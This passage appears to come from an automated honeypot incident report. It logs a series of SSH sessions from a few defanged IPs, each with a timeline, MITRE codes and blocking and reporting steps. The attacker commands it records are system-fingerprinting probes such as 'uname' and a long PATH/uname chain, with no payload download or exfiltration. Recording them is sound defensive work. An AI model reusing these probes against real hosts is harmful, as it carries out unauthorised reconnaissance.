| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:13:08` | `cowrie.session.connect` |
| `2026-08-15 01:13:08` | `cowrie.client.version` |
| `2026-08-15 01:13:08` | `cowrie.client.kex` |
| `2026-08-15 01:13:09` | `cowrie.login.success` |
| `2026-08-15 01:13:11` | `cowrie.session.params` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.success` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.command.input` |
| `2026-08-15 01:13:11` | `cowrie.log.closed` |
| `2026-08-15 01:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c361905381c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:15 |
| **Last Seen** | 2026-08-15 01:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:15:04` | `cowrie.session.connect` |
| `2026-08-15 01:15:04` | `cowrie.client.version` |
| `2026-08-15 01:15:04` | `cowrie.client.kex` |
| `2026-08-15 01:15:05` | `cowrie.login.success` |
| `2026-08-15 01:15:06` | `cowrie.session.params` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.success` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:06` | `cowrie.command.input` |
| `2026-08-15 01:15:07` | `cowrie.log.closed` |
| `2026-08-15 01:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71ac79a9063

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 01:15 |
| **Last Seen** | 2026-08-15 01:16 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:15:54` | `cowrie.session.connect` |
| `2026-08-15 01:16:00` | `cowrie.client.version` |
| `2026-08-15 01:16:00` | `cowrie.client.kex` |
| `2026-08-15 01:16:22` | `cowrie.login.success` |
| `2026-08-15 01:16:35` | `cowrie.session.params` |
| `2026-08-15 01:16:35` | `cowrie.command.input` |
| `2026-08-15 01:16:40` | `cowrie.log.closed` |
| `2026-08-15 01:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4938f6eeff95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:16 |
| **Last Seen** | 2026-08-15 01:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:16:47` | `cowrie.session.connect` |
| `2026-08-15 01:16:48` | `cowrie.client.version` |
| `2026-08-15 01:16:48` | `cowrie.client.kex` |
| `2026-08-15 01:16:50` | `cowrie.login.success` |
| `2026-08-15 01:16:52` | `cowrie.session.params` |
| `2026-08-15 01:16:52` | `cowrie.command.input` |
| `2026-08-15 01:16:52` | `cowrie.log.closed` |
| `2026-08-15 01:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0c1a7a64822

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:16 |
| **Last Seen** | 2026-08-15 01:17 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:16:56` | `cowrie.session.connect` |
| `2026-08-15 01:16:58` | `cowrie.client.version` |
| `2026-08-15 01:16:58` | `cowrie.client.kex` |
| `2026-08-15 01:17:09` | `cowrie.login.success` |
| `2026-08-15 01:17:15` | `cowrie.session.params` |
| `2026-08-15 01:17:15` | `cowrie.command.input` |
| `2026-08-15 01:17:17` | `cowrie.log.closed` |
| `2026-08-15 01:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d422eba6916

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:17 |
| **Last Seen** | 2026-08-15 01:17 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:17:02` | `cowrie.session.connect` |
| `2026-08-15 01:17:06` | `cowrie.client.version` |
| `2026-08-15 01:17:06` | `cowrie.client.kex` |
| `2026-08-15 01:17:17` | `cowrie.login.success` |
| `2026-08-15 01:17:21` | `cowrie.session.params` |
| `2026-08-15 01:17:21` | `cowrie.command.input` |
| `2026-08-15 01:17:22` | `cowrie.log.closed` |
| `2026-08-15 01:17:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0efd89531931

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:17 |
| **Last Seen** | 2026-08-15 01:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:17:04` | `cowrie.session.connect` |
| `2026-08-15 01:17:04` | `cowrie.client.version` |
| `2026-08-15 01:17:04` | `cowrie.client.kex` |
| `2026-08-15 01:17:05` | `cowrie.login.success` |
| `2026-08-15 01:17:06` | `cowrie.session.params` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.success` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.command.input` |
| `2026-08-15 01:17:06` | `cowrie.log.closed` |
| `2026-08-15 01:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1234b5f9b7a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:17 |
| **Last Seen** | 2026-08-15 01:17 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:17:17` | `cowrie.session.connect` |
| `2026-08-15 01:17:19` | `cowrie.client.version` |
| `2026-08-15 01:17:19` | `cowrie.client.kex` |
| `2026-08-15 01:17:26` | `cowrie.login.success` |
| `2026-08-15 01:17:30` | `cowrie.session.params` |
| `2026-08-15 01:17:30` | `cowrie.command.input` |
| `2026-08-15 01:17:32` | `cowrie.log.closed` |
| `2026-08-15 01:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a27db814d046

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:17 |
| **Last Seen** | 2026-08-15 01:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:17:26` | `cowrie.session.connect` |
| `2026-08-15 01:17:28` | `cowrie.client.version` |
| `2026-08-15 01:17:28` | `cowrie.client.kex` |
| `2026-08-15 01:17:34` | `cowrie.login.success` |
| `2026-08-15 01:17:37` | `cowrie.session.params` |
| `2026-08-15 01:17:37` | `cowrie.command.input` |
| `2026-08-15 01:17:38` | `cowrie.log.closed` |
| `2026-08-15 01:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b0aa2e3baa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:17 |
| **Last Seen** | 2026-08-15 01:17 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:17:37` | `cowrie.session.connect` |
| `2026-08-15 01:17:38` | `cowrie.client.version` |
| `2026-08-15 01:17:38` | `cowrie.client.kex` |
| `2026-08-15 01:17:45` | `cowrie.login.success` |
| `2026-08-15 01:17:49` | `cowrie.session.params` |
| `2026-08-15 01:17:49` | `cowrie.command.input` |
| `2026-08-15 01:17:51` | `cowrie.log.closed` |
| `2026-08-15 01:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a6698dc2179

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:17 |
| **Last Seen** | 2026-08-15 01:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:17:45` | `cowrie.session.connect` |
| `2026-08-15 01:17:47` | `cowrie.client.version` |
| `2026-08-15 01:17:47` | `cowrie.client.kex` |
| `2026-08-15 01:17:54` | `cowrie.login.success` |
| `2026-08-15 01:17:56` | `cowrie.session.params` |
| `2026-08-15 01:17:56` | `cowrie.command.input` |
| `2026-08-15 01:17:57` | `cowrie.log.closed` |
| `2026-08-15 01:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ac29459f2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:17 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:17:56` | `cowrie.session.connect` |
| `2026-08-15 01:17:57` | `cowrie.client.version` |
| `2026-08-15 01:17:57` | `cowrie.client.kex` |
| `2026-08-15 01:18:04` | `cowrie.login.success` |
| `2026-08-15 01:18:09` | `cowrie.session.params` |
| `2026-08-15 01:18:09` | `cowrie.command.input` |
| `2026-08-15 01:18:09` | `cowrie.log.closed` |
| `2026-08-15 01:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9078c83deecd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:18 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:18:04` | `cowrie.session.connect` |
| `2026-08-15 01:18:06` | `cowrie.client.version` |
| `2026-08-15 01:18:06` | `cowrie.client.kex` |
| `2026-08-15 01:18:08` | `cowrie.login.success` |
| `2026-08-15 01:18:09` | `cowrie.session.params` |
| `2026-08-15 01:18:09` | `cowrie.command.input` |
| `2026-08-15 01:18:09` | `cowrie.log.closed` |
| `2026-08-15 01:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9abc9ee3b83

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 01:18 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:18:14` | `cowrie.session.connect` |
| `2026-08-15 01:18:14` | `cowrie.client.version` |
| `2026-08-15 01:18:14` | `cowrie.client.kex` |
| `2026-08-15 01:18:15` | `cowrie.login.success` |
| `2026-08-15 01:18:16` | `cowrie.session.params` |
| `2026-08-15 01:18:16` | `cowrie.command.input` |
| `2026-08-15 01:18:16` | `cowrie.log.closed` |
| `2026-08-15 01:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e997450643b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:18 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:18:16` | `cowrie.session.connect` |
| `2026-08-15 01:18:17` | `cowrie.client.version` |
| `2026-08-15 01:18:17` | `cowrie.client.kex` |
| `2026-08-15 01:18:21` | `cowrie.login.success` |
| `2026-08-15 01:18:24` | `cowrie.session.params` |
| `2026-08-15 01:18:24` | `cowrie.command.input` |
| `2026-08-15 01:18:25` | `cowrie.log.closed` |
| `2026-08-15 01:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c99c199317a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:18 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:18:25` | `cowrie.session.connect` |
| `2026-08-15 01:18:25` | `cowrie.client.version` |
| `2026-08-15 01:18:25` | `cowrie.client.kex` |
| `2026-08-15 01:18:30` | `cowrie.login.success` |
| `2026-08-15 01:18:32` | `cowrie.session.params` |
| `2026-08-15 01:18:32` | `cowrie.command.input` |
| `2026-08-15 01:18:33` | `cowrie.log.closed` |
| `2026-08-15 01:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82eeb4dbc8f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:18 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:18:34` | `cowrie.session.connect` |
| `2026-08-15 01:18:35` | `cowrie.client.version` |
| `2026-08-15 01:18:35` | `cowrie.client.kex` |
| `2026-08-15 01:18:37` | `cowrie.login.success` |
| `2026-08-15 01:18:38` | `cowrie.session.params` |
| `2026-08-15 01:18:38` | `cowrie.command.input` |
| `2026-08-15 01:18:39` | `cowrie.log.closed` |
| `2026-08-15 01:18:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6db2dbf9639

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:18 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:18:45` | `cowrie.session.connect` |
| `2026-08-15 01:18:45` | `cowrie.client.version` |
| `2026-08-15 01:18:45` | `cowrie.client.kex` |
| `2026-08-15 01:18:46` | `cowrie.login.success` |
| `2026-08-15 01:18:47` | `cowrie.session.params` |
| `2026-08-15 01:18:47` | `cowrie.command.input` |
| `2026-08-15 01:18:47` | `cowrie.log.closed` |
| `2026-08-15 01:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f44ee10dd27

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:18 |
| **Last Seen** | 2026-08-15 01:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:18:53` | `cowrie.session.connect` |
| `2026-08-15 01:18:54` | `cowrie.client.version` |
| `2026-08-15 01:18:54` | `cowrie.client.kex` |
| `2026-08-15 01:18:56` | `cowrie.login.success` |
| `2026-08-15 01:18:58` | `cowrie.session.params` |
| `2026-08-15 01:18:58` | `cowrie.command.input` |
| `2026-08-15 01:18:59` | `cowrie.log.closed` |
| `2026-08-15 01:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d57d51d7a05b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:02` | `cowrie.session.connect` |
| `2026-08-15 01:19:02` | `cowrie.client.version` |
| `2026-08-15 01:19:02` | `cowrie.client.kex` |
| `2026-08-15 01:19:03` | `cowrie.login.success` |
| `2026-08-15 01:19:04` | `cowrie.session.params` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.success` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.command.input` |
| `2026-08-15 01:19:04` | `cowrie.log.closed` |
| `2026-08-15 01:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a4fe80cbb6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:03` | `cowrie.session.connect` |
| `2026-08-15 01:19:03` | `cowrie.client.version` |
| `2026-08-15 01:19:03` | `cowrie.client.kex` |
| `2026-08-15 01:19:05` | `cowrie.login.success` |
| `2026-08-15 01:19:07` | `cowrie.session.params` |
| `2026-08-15 01:19:07` | `cowrie.command.input` |
| `2026-08-15 01:19:07` | `cowrie.log.closed` |
| `2026-08-15 01:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4539034497b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:12` | `cowrie.session.connect` |
